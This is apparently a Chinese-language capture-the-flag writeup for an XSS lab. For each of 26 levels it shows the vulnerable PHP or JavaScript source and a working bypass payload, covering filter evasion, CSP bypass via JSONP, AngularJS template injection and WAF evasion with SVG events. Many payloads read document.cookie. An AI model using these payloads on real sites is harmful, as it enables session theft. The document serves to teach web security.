# XSS Labs Writeup

本靶场包含 20 个不同类型的 XSS 关卡。以下是每一关的源码分析及通关思路。

---

## Level 1: Reflected XSS (Basic)

**源码分析：**
```php
$name = $_GET['name'];
// Vulnerability: No sanitization
echo "Hello, " . $name . "!";
```
后端直接接收 `name` 参数并输出到页面中，没有任何过滤或转义。

**通关思路：**
直接构造 Payload 即可。
**Payload:** `<script>alert(1)</script>`

---

## Level 2: DOM-based XSS

**源码分析：**
```javascript
const keyword = urlParams.get('keyword');
if (keyword) {
    const container = document.getElementById('result');
    container.innerHTML = "Search results for: " + keyword;
    // ... manual script execution logic ...
}
```
JS 从 URL 获取 `keyword` 参数并写入 `innerHTML`。虽然通常 `innerHTML` 不执行 `<script>`，但本关卡模拟了框架行为，主动扫描并执行了注入的脚本。

**通关思路：**
利用 `<img>` 等标签的事件属性，或者直接利用模拟执行的特性。
**Payload 1:** `<img src=x onerror=alert(1)>`
**Payload 2:** `<script>alert(1)</script>` (得益于模拟执行逻辑)

---

## Level 3: Stored XSS

**源码分析：**
```php
// 写入
file_put_contents($file, json_encode($data));
// 读取并输出
foreach (array_reverse($comments) as $c):
    echo $c['text']; // Vulnerability: No sanitization
endforeach;
```
用户的评论被保存到 JSON 文件中，读取时未经过 `htmlspecialchars` 处理直接输出。

**通关思路：**
在评论框输入恶意脚本，脚本被存储。当页面加载时，脚本被渲染执行。
**Payload:** `<script>alert(1)</script>`

---

## Level 4: Attribute Breakout

**源码分析：**
```php
$keyword = $_GET['keyword'];
// ...
echo '<input type="text" name="keyword" value="' . $keyword . '">';
```
输入被输出到了 `<input>` 标签的 `value` 属性中，且由**双引号**包裹。后端未对双引号进行转义。

**通关思路：**
闭合前面的双引号，添加事件属性，注释掉后面的内容。
**Payload:** `" onclick="alert(1)`
**解析后 HTML:** `<input value="" onclick="alert(1)">`

---

## Level 5: Filter Bypass (No Script)

**源码分析：**
```php
$str = str_ireplace("<script", "<scr_ipt", $str);
// on events are ALLOWED
```
后端使用 `str_ireplace` 将 `<script` 替换为 `<scr_ipt`，这阻止了直接使用 `<script>` 标签。但未过滤事件属性（如 `on...`）或伪协议。

**通关思路：**
利用不需要 `<script>` 标签的 Payload，例如 `<a>` 标签的 `href` 属性或事件属性。
**Payload:** `<a href="javascript:alert(1)">Click</a>`
**Payload:** `<img src=x onerror=alert(1)>`

---

## Level 6: Quote Filtering

**源码分析：**
```php
$keyword_safe = str_replace('"', '&quot;', $keyword);
// ...
echo "<input type='text' name='keyword' value='" . $keyword_safe . "'>";
```
后端过滤了双引号 `"`，但 HTML 源码中使用**单引号** `'` 包裹属性值。

**通关思路：**
利用 HTML 解析的宽容性，使用单引号闭合属性。
**Payload:** `' onclick='alert(1)`
**解析后 HTML:** `<input value='' onclick='alert(1)'>`

---

## Level 7: Keyword Removal (Double Write)

**源码分析：**
```php
$bad_words = ['script', 'on', 'src', 'data', 'href'];
$str = str_ireplace($bad_words, '', $str);
```
后端将敏感关键词替换为空字符串，且只执行了一次替换（非递归）。

**通关思路：**
双写关键词。例如 `script` 被替换为空，那么 `scrscriptipt` 中间的 `script` 消失后，两边的字符会重新拼合。
**Payload:** `"><scrscriptipt>alert(1)</scrscriptipt>`

---

## Level 8: Encoding Bypass

**源码分析：**
```php
$str = str_replace("script", "scr_ipt", $str);
// ... other replacements ...
$str = str_replace('"', '&quot;', $str);
echo '<a href="' . $str . '">Your Link</a>';
```
后端替换了大量关键词，并转义了双引号。但是输入点在 `href` 属性中。

**通关思路：**
利用 HTML 实体编码。浏览器在解析属性值时会自动解码实体。
**Payload:** `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;` (j 被编码为 `&#106;`)
**浏览器解析:** `href="javascript:alert(1)"`

---

## Level 9: URL Validation

**源码分析：**
```php
$str = str_ireplace("script", "", $str); // 关键词清洗
if (strpos($str, 'http://') === false) {
    die("Error"); // 必须包含 http://
}
```
1.  输入必须包含 `http://`。
2.  `script` 关键词被清洗（替换为空）。

**通关思路：**
构造包含 `http://` 的 Payload，同时利用双写绕过 `script` 清洗。利用 JS 注释 `//` 来隐藏 `http://`。
**Payload:** `javascrscriptipt:alert(document.cookie)//http://`
**后端清洗后:** `javascript:alert(document.cookie)//http://`

---

## Level 10: Protocol Bypass (Case Sensitivity)

**源码分析：**
```php
$str = str_replace("javascript", "", $str);
$str = str_replace("script", "", $str);
// 使用 str_replace (大小写敏感)
```
后端使用大小写敏感的 `str_replace` 过滤了全小写的 `javascript`。

**通关思路：**
利用浏览器对协议解析的大小写不敏感特性。
**Payload:** `JavaScript:alert(1)`
**后端处理:** 无法匹配 `javascript`，原样放行。
**浏览器解析:** 识别为 `javascript:` 协议并执行。

---

## Level 11: JS Context

**源码分析：**
```php
$str_safe = str_replace(['<', '>'], ['&lt;', '&gt;'], $str);
echo "var t_str = '$str_safe';";
```
输入被放置在 JS 变量的单引号字符串中。
虽然过滤了 `<` 和 `>`（防止直接闭合 `<script>` 标签），但**没有过滤单引号 `'`**。

**通关思路：**
闭合前面的单引号，使用分号结束语句，执行 Payload，注释掉后面的内容。
**Payload:** `';alert(1);//`
**生成代码:** `var t_str = '';alert(1);//';`

---

## Level 12: DOM XSS via Hash

**源码分析：**
```javascript
var hash = window.location.hash;
if (hash) {
    var content = decodeURIComponent(hash.substring(1));
    document.getElementById('message-container').innerHTML = "Welcome back, " + content;
}
```
后端完全没有处理输入，因为输入是通过 URL Hash (`#`) 传递的，这部分根本不会发送给服务器。
前端 JS 读取 `location.hash` 并写入 `innerHTML`。

**通关思路：**
这是一种纯前端的 DOM XSS。由于数据不经过服务器，所有服务端 WAF 都无效。
直接构造包含 Payload 的 Hash。
**Payload:** `#<img src=x onerror=alert(1)>`
**注意:** 由于使用 `innerHTML`，直接 `<script>` 通常不执行，推荐使用 `<img>` 或 `<iframe>`。

---

## Level 13: Frontend Filter

**源码分析：**
```javascript
const blacklist = /<script|javascript:/i;
if (blacklist.test(keyword)) {
    // Blocked
} else {
    document.getElementById('result').innerHTML = "Results: " + keyword;
}
```
JS 使用正则 `/ <script|javascript:/i` 对输入进行了检测。如果通过，则写入 `innerHTML`。

**通关思路：**
正则只拦截了 `<script` 和 `javascript:`。但 `innerHTML` 还支持其他大量的 XSS 向量，如 `<img>`, `<iframe>`, `<svg>` 等。
**Payload:** `<img src=x onerror=alert(1)>`
**Payload:** `<svg/onload=alert(1)>`

---

## Level 14: Double Encoding

**源码分析：**
```php
$encoded = urlencode($str);
echo "var currentUrl = '$encoded';";
```
后端对输入进行了 `urlencode`，看起来很安全，`%`、`'`、`<` 等都会被编码。
但前端使用了危险的 Sink：
```javascript
var decodedUrl = decodeURIComponent(currentUrl);
setTimeout('console.log("' + decodedUrl + '")', 100);
```
`setTimeout` 的第一个参数如果是字符串，会像 `eval` 一样执行代码。且执行前先进行了解码。

**通关思路：**
本关模拟了一个“双重编码”绕过场景。
1.  **WAF 过滤**：后端使用 `preg_match` 拦截了 `'`、`"`、`<`、`>`。如果直接输入 `';alert(1);//`，会被拦截并替换为 `_`。
2.  **后端编码**：WAF 检查通过后，后端使用 `urlencode` 对字符串进行了编码（例如 `'` 变成 `%27`）。
3.  **前端双重解码**：前端代码为了兼容旧数据，执行了**两次** `decodeURIComponent`。

**攻击路径：**
我们需要让 Payload 在经过 PHP 的自动 URL 解码后，仍然不包含 `'` 或 `"` 等危险字符（绕过 WAF），但在前端两次解码后还原出 `"`（双引号）。
*   **注意**：代码中的 Sink 是 `setTimeout('console.log("Log: ' + step2 + '")', 100);`。
    *   这里使用了**双引号** `"` 来包裹日志内容。
    *   所以我们需要闭合双引号，而不是单引号。
*   **输入**：`%22` (即 `"`)。
*   **WAF 检查**：检查 `%22`，未发现 `"`，放行。
*   **PHP 输出**：`urlencode('%22')` -> `%2522`。
*   **前端 Decode #1**：`decodeURIComponent('%2522')` -> `%22`。
*   **前端 Decode #2**：`decodeURIComponent('%22')` -> `"`。
*   **执行**：`setTimeout` 中字符串被闭合，代码执行。

**Payload:** `%22);alert(1);//`
**解释**：
*   `%22` -> `"` (闭合前面的双引号字符串)
*   `);` (闭合 `console.log(`)
*   `alert(1);` (执行代码)
*   `//` (注释掉后面多余的 `")`)
**注意：** 
如果浏览器地址栏自动对 `%` 进行编码，则实际输入 `%22` 即可。
如果需要手动构造完整编码包，则为 `%2522);alert(1);//`。
流程：`%2522` -> PHP解码 -> `%22` -> WAF通过 -> PHP编码 -> `%2522` -> JS双重解码 -> `"`。

---

## Level 15: Framework Injection

**源码分析：**
```php
$safe_html = htmlspecialchars($str);
echo "<div id='result'>Hello, $safe_html</div>";
```
虽然 HTML 标签被转义，但输出位于 AngularJS 的 `ng-app` 作用域内。AngularJS 会解析 `{{ }}` 模板语法。

**通关思路：**
利用 AngularJS 模板注入 (CSTI, Client-Side Template Injection)。
因为输出点在 `ng-app` 作用域内，AngularJS 会扫描并解析 `{{ ... }}` 语法。虽然 HTML 标签被转义了，但 `{{` 和 `}}` 没有被转义。

**Payload:** `{{constructor.constructor('alert(1)')()}}`

**Payload 解析：**
1.  `{{ ... }}`：AngularJS 的插值语法，其中的内容会被作为表达式求值。
2.  `constructor`：在 AngularJS 的表达式沙箱中，通常直接访问 `window` 或 `document` 是被禁止的。但是，我们可以访问对象的 `constructor` 属性。
3.  `constructor.constructor`：
    *   第一个 `constructor` 获取当前上下文对象（scope）的构造函数。
    *   第二个 `constructor` 获取该构造函数的构造函数，这通常就是 JavaScript 原生的 `Function` 构造函数。
    *   `Function` 构造函数允许我们将字符串当作代码来创建新的函数（类似于 `eval`）。
4.  `('alert(1)')`：这是传给 `Function` 构造函数的参数，即我们要执行的恶意代码。
5.  最后的 `()`：立即调用这个刚刚创建出来的匿名函数，从而执行 `alert(1)`。

简而言之，这个 Payload 利用了 JS 的原型链特性，绕过 AngularJS 的沙箱限制，动态构造并执行了一个包含 `alert(1)` 的函数。

---

## Level 16: PostMessage XSS

**源码分析：**
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('message-output').innerHTML = "Received: " + e.data;
});
```
后端过滤了 `iframe` src 中的 `javascript:`，但允许 `data:`。
iframe 加载 `data:` 协议内容后，源变为 `null`（opaque origin），无法直接访问父页面 DOM。
但父页面有一个监听 `message` 事件的 Handler，且直接将接收到的数据写入 `innerHTML`。

**通关思路：**
构造一个 `data:` 协议的 iframe，在其中运行 JS，通过 `parent.postMessage()` 发送 XSS Payload 给父页面。
**Payload:** `data:text/html,<script>parent.postMessage('<img src=x onerror=alert(1)>', '*')</script>`

---

## Level 17: CSP Bypass (JSONP)

**源码分析：**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self';");
if (isset($_GET['callback'])) {
    echo $_GET['callback'] . '({"status": "ok"});';
    exit;
}
```
启用了一个严格的 CSP：只允许同源脚本，禁止 inline 脚本。
这意味着 `<script>alert(1)</script>` 无法执行。
但是，同源下有一个 JSONP 端点（`?callback=...`），它会返回 JavaScript 代码。

**通关思路：**
利用 CSP 允许的同源脚本源（'self'）。
我们可以加载这个 JSONP 端点作为脚本，并控制 callback 参数来执行任意 JS。
**Payload:** `<script src="?callback=alert(1)"></script>`

---

## Level 18: Anchor Href XSS

**源码分析：**
```php
$website_safe = htmlspecialchars($website, ENT_QUOTES); 
// ...
echo '<a href="' . $c['website'] . '">' . $c['author'] . '</a>';
```
输入被 `htmlspecialchars` 处理，这意味着双引号 `"` 和单引号 `'` 都会被转义，无法闭合 `href` 属性。
但是，`href` 属性本身支持 `javascript:` 伪协议。
代码**没有检查 URL 的协议头**。

**通关思路：**
直接在 Website 字段输入 `javascript:alert(1)`。
当其他用户（或管理员）点击评论者的名字时，JS 代码执行。
**Payload:** `javascript:alert(1)`

---

## Level 19: DOM XSS in Select

**源码分析：**
```javascript
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
// ...
document.write('</select>');
```
页面使用 `document.write` 动态生成了一个下拉菜单 (`<select>`)。
`storeId` 参数从 URL 获取后，直接拼接到 `document.write` 的 HTML 字符串中，且没有进行任何转义。

**通关思路：**
我们需要闭合当前的 `<option>` 和 `<select>` 标签，然后插入恶意标签。
**Payload:** `</option></select><img src=x onerror=alert(1)>`
**最终渲染结果：**
```html
<select name="storeId">
    <option selected></option></select><img src=x onerror=alert(1)></option>
    <!-- ... options ... -->
</select>
```
由于 `<select>` 被提前闭合，`<img>` 标签位于 `<select>` 之外，因此可以被浏览器解析并执行。

---

## Level 20: jQuery Anchor XSS

**源码分析：**
```javascript
var returnPath = new URLSearchParams(window.location.search).get('returnPath');
$('#backLink').attr('href', returnPath);
```
前端使用 jQuery 的 `attr` 方法将 URL 参数 `returnPath` 赋值给 `<a>` 标签的 `href` 属性。
jQuery 的 `attr` 方法虽然会处理属性值的引号问题，但**不会过滤伪协议**。

**通关思路：**
利用 `javascript:` 伪协议执行 XSS。
**Payload:** `javascript:alert(1)`

---

## Level 21: JS String Reflection

**源码分析：**
```php
searchTerm: '<?php echo isset($_GET['q']) ? htmlspecialchars($_GET['q'], ENT_COMPAT) : ''; ?>',
```
输入被反射在 JavaScript 对象的属性值中，被单引号包裹。
后端使用了 `htmlspecialchars($q, ENT_COMPAT)`。
*   `ENT_COMPAT` (默认模式) 仅编码双引号 `"`，**不编码单引号 `'`**。
*   HTML 实体编码（如 `<` 变 `&lt;`）在 JS 字符串中不起作用（JS 引擎不解析 HTML 实体）。

**通关思路：**
虽然 `<script>` 标签会被编码，但我们不需要它。我们只需要闭合 JS 字符串。
利用未被转义的单引号 `'` 闭合前面的字符串，插入 Payload，然后注释掉后面的内容。
**Payload:** `'-alert(1)-'`
**最终渲染代码：**
```javascript
searchTerm: ''-alert(1)-'',
```
这实际上是一个数学减法运算：`''` (空字符串) 减去 `alert(1)` 的返回值，再减去 `''`。在运算过程中 `alert(1)` 被执行。
或者使用分号：`';alert(1);//` -> `searchTerm: '';alert(1);//',`

---

## Level 22: Reflected DOM XSS

**源码分析：**
**服务端 (PHP):**
```php
$safe_q = str_replace('"', '\"', $q);
echo '{"results":[],"searchTerm":"' . $safe_q . '"}';
```
服务端试图通过转义双引号 `"` 来防止跳出 JSON 字符串值。但关键的是，它**没有转义反斜杠 `\`**。

**客户端 (JS):**
```javascript
var searchResultsObj = eval('(' + this.responseText + ')');
```
客户端使用 `eval()` 来解析服务端返回的 JSON 字符串。这是极其危险的操作，因为 `eval` 会执行任何有效的 JS 代码。

**通关思路：**
我们需要闭合 JSON 中的字符串。
由于服务端将 `"` 转义为 `\"`，我们无法直接使用 `"` 闭合。
但是，我们可以输入 `\"`。
1.  我们输入 `\`，服务端不转义，保留为 `\`。
2.  我们输入 `"`，服务端转义为 `\"`。
3.  组合起来，Payload `\"` 变成了 `\\"`。
4.  在 JS 字符串中：
    *   `\\` 解析为字面量反斜杠 `\`。
    *   `"` 解析为字符串结束引号（因为它前面的反斜杠已经被消耗了，不再起转义作用）。

**Payload:** `\"-alert(1)})//`

**执行流程解析：**
1.  用户输入: `\"-alert(1)})//`
2.  服务端处理: `\` 保持不变，`"` 变为 `\"`。结果: `\\"-alert(1)})//`
3.  JSON 响应: `{"results":...,"searchTerm":"\\"-alert(1)})//"}`
4.  `eval` 执行:
    *   代码被包裹在括号中: `(` + JSON + `)`
    *   `"searchTerm":"\\"` -> 字符串值为 `\`
    *   `-alert(1)` -> 减去 alert(1) 的结果 (导致 alert 执行)
    *   `})` -> 闭合对象和外层括号
    *   `//` -> 注释掉剩余字符 (即原本的 `"})`)
    *   最终代码: `({"searchTerm":"\\" -alert(1)})` -> 合法 JS 代码，执行成功。

**注意：**
`eval` 在处理 JSON 时通常会包裹一层括号 `eval('(' + json + ')')` 以强制解析为对象。因此，Payload 必须包含 `)` 来闭合这个外层括号，否则会报 SyntaxError。

---

## Level 23: Stored DOM XSS

**源码分析：**

**后端 (comment.php):**
后端负责接收评论并存储到 JSON 文件中。**没有任何过滤或转义逻辑**。这意味着无论用户提交什么，都会原样保存。

**前端 (JS):**
前端负责获取评论并在页面上显示。开发者意识到了 XSS 风险，因此实现了一个 `escapeHTML` 函数来转义危险字符。
```javascript
// VULNERABLE FUNCTION
function escapeHTML(html) {
    if (!html) return '';
    return html.replace('<', '&lt;').replace('>', '&gt;');
}

// ...
const safeText = escapeHTML(comment.text);
item.innerHTML = `... <div class="comment-body">${safeText}</div> ...`;
```
**核心漏洞点**：JavaScript 的 `String.prototype.replace(pattern, replacement)` 方法，当 `pattern` 是一个字符串时，它**只替换第一个匹配项**。
如果要替换所有匹配项，通常需要使用正则表达式（如 `/<g`）或 `replaceAll` 方法。
在这里，开发者错误地使用了字符串参数，导致如果输入中有多个 `<` 或 `>`，只有第一个会被转义，后面的都会保留原样。

**通关思路：**
我们需要构造一个 Payload，使得恶意的 HTML 标签位于第一个 `<` 和 `>` 之后。
我们可以简单地在 Payload 前面添加一对“牺牲品”尖括号。

**Payload:** `<><img src=1 onerror=alert(document.cookie)>`

**详细执行流程解析：**
1.  **提交评论**：攻击者在评论框中输入 `<><img src=1 onerror=alert(document.cookie)>` 并提交。
2.  **存储**：后端接收到该字符串，原样存入 `comments.json`。
3.  **加载评论**：页面加载（或刷新评论列表）时，JS 从后端获取该字符串。
4.  **不完全清洗**：
    *   `escapeHTML` 被调用。
    *   `html.replace('<', '&lt;')` 执行：字符串变成了 `&lt;><img src=1 onerror=alert(document.cookie)>`。注意，只有第一个 `<` 变了。
    *   `html.replace('>', '&gt;')` 执行：字符串变成了 `&lt;&gt;<img src=1 onerror=alert(document.cookie)>`。注意，只有第一个 `>` 变了。
5.  **DOM 渲染**：
    *   JS 将处理后的字符串插入到 `innerHTML` 中。
    *   浏览器解析 HTML：
        *   `&lt;&gt;` 被解析为普通的文本字符 `<>`。
        *   后面的 `<img src=1 onerror=alert(document.cookie)>` 仍然是有效的 HTML 标签结构！
    *   浏览器尝试加载图片（`src=1`），加载失败。
    *   触发 `onerror` 事件处理函数。
    *   执行 `alert(document.cookie)`，弹出 Flag。

**Flag:** `flag{a1b2c3d4-e5f6-7890-1234-567890abcdef}`

---

## Level 24: WAF Bypass (Tags/Attributes)

**源码分析：**
```php
// WAF Logic
$blocked_tags = ['script', 'img', 'iframe', ...]; // 包含绝大多数常见标签
$blocked_attributes = ['onload', 'onerror', 'onclick', ...]; // 包含绝大多数常见事件

// ...
if (preg_match("/<\s*$tag\b/i", $input_lower)) { die("Tag Not Allowed"); }
// ...
```
本关卡模拟了一个配置了 WAF (Web Application Firewall) 的环境。
1.  **黑名单机制**：后端定义了庞大的标签和属性黑名单。
2.  **反射点**：输入内容被直接反射在 `<h2>` 标签中。

**通关思路：**
面对黑名单 WAF，首要任务是**Fuzzing (模糊测试)**，找出哪些标签和属性是被允许的。
通过测试（或者查看源码/提示），我们可以发现：
*   **允许的标签**：`<body>`
*   **允许的属性**：`onresize`

我们需要构造一个 Payload，利用 `<body>` 标签和 `onresize` 事件。
但是，`onresize` 事件只有在窗口大小改变时才会触发。我们需要一种自动触发的方式。
**技巧**：使用 `<iframe>` (外部) 来加载这个 Payload，并在 `<iframe>` 加载完成时 (`onload`) 改变其自身的大小，从而触发内部页面的 `onresize` 事件。

**Payload:** `<body onresize=alert(document.cookie)>`

**利用步骤 (Exploit):**
由于这是一个 Reflected XSS，且需要用户交互（调整窗口大小）或特殊的触发条件，我们需要构造一个包含利用代码的恶意页面（Exploit Server）：

```html
<iframe src="http://target-site/level24/index.php?search=%3Cbody%20onresize=alert(document.cookie)%3E" onload="this.style.width='100px'"></iframe>
```

**原理解析：**
1.  受害者访问我们的恶意页面。
2.  页面加载一个 `iframe`，指向目标网站，URL 中包含 Payload `<body onresize=alert(document.cookie)>`。
3.  目标网站渲染页面，HTML 中出现 `<body onresize=alert(document.cookie)>`。
    *   虽然页面本身已有 `<body>`，但现代浏览器通常会解析后续的 `<body>` 标签，并将其属性合并或执行其中的脚本。
4.  `iframe` 加载完成后，触发 `iframe` 自身的 `onload` 事件：`this.style.width='100px'`。
5.  `iframe` 的宽度发生变化，导致 `iframe` 内部文档（即目标网站）的视口大小改变。
6.  目标网站捕捉到视口变化，触发 `body` 上的 `onresize` 事件。
7.  执行 `alert(document.cookie)`，弹出 Flag。

**Flag:** `flag{bf38249a-5e17-4861-8321-468213612345}`

---

## Level 25: SVG Animate XSS

**源码分析：**
```php
// WAF Logic
$blocked_tags = ['script', 'iframe', 'body', 'img', ...]; 
// 'svg', 'animatetransform' are ALLOWED

$blocked_attributes = ['onload', 'onerror', 'onclick', 'onresize', ...]; 
// 'onbegin' is ALLOWED
```
本关卡 WAF 更加严格，封禁了 `<body>` 和 `onresize`，甚至封禁了 `<img>` 和常见事件。
但是，它遗漏了 SVG 相关的标签和事件。

**通关思路：**
SVG (Scalable Vector Graphics) 拥有自己的一套标签和事件体系。
*   `<svg>` 标签可以包含 `<animate>` 或 `<animateTransform>` 等动画标签。
*   这些动画标签支持 `onbegin` 事件（动画开始时触发）。
*   利用这一点，我们可以构造一个不包含任何常见 HTML 标签或常见事件（如 `onload`, `onerror`）的 Payload。

**Payload:** `<svg><animatetransform onbegin=alert(1)>`

**注意：**
在某些浏览器中，SVG 动画事件可能需要特定的触发条件或兼容性支持。但在现代浏览器中，`onbegin` 通常会在 SVG 加载并开始渲染时自动触发。

**Flag:** `flag{e8f9a0b1-c2d3-4e5f-6a7b-8c9d0e1f2a3b}`

## Level 26: Canonical Link XSS

**源码分析：**
```php
// VULNERABILITY: 
// The developer uses htmlspecialchars without ENT_QUOTES to escape the URL.
// This means single quotes ' are NOT escaped.
$safe_url = htmlspecialchars($current_url); 
// ...
// The href attribute is enclosed in single quotes
echo "<link rel='canonical' href='$safe_url'>";
```
本关卡模拟了一个 SEO 优化场景，页面包含一个指向自身的 `<link rel="canonical">` 标签。
1.  **输入点**：URL 参数（`$_SERVER['REQUEST_URI']`）。
2.  **漏洞点**：PHP 的 `htmlspecialchars` 函数在默认情况下（PHP 8.1 之前）或未指定 `ENT_QUOTES` 时，**不会转义单引号**。
3.  **Sink**：`<link href='...'>` 属性值被单引号包裹。

**通关思路：**
由于单引号未被转义，我们可以使用单引号 `'` 闭合 `href` 属性，然后注入其他属性。
虽然 `<link>` 标签通常不可见，但我们可以利用 `accesskey` 属性配合 `onclick` 事件。
*   `accesskey="x"`：定义激活元素的快捷键（Windows 下通常是 `Alt + Shift + X`）。
*   `onclick="alert(1)"`：当元素被激活（点击或快捷键）时触发。

**Payload:** `/?%27accesskey=%27x%27onclick=%27alert(1)`

**执行流程解析：**
1.  用户访问 URL：`http://localhost/level26/?'accesskey='x'onclick='alert(1)`
2.  服务端生成的 HTML：
    ```html
    <link rel="canonical" href='http://localhost/level26/?'accesskey='x'onclick='alert(1)'>
    ```
3.  浏览器解析：
    *   `href='http://localhost/level26/?'` (属性结束)
    *   `accesskey='x'` (新属性)
    *   `onclick='alert(1)'` (新属性)
    *   `>` (标签结束)
4.  **触发攻击**：用户按下快捷键 `Alt + Shift + X` (Windows) 或 `Ctrl + Alt + X` (Mac)，触发 `onclick` 事件，执行 `alert(1)`。

**Flag:** `flag{a1b2c3d4-e5f6-7890-1234-567890abcdef}`

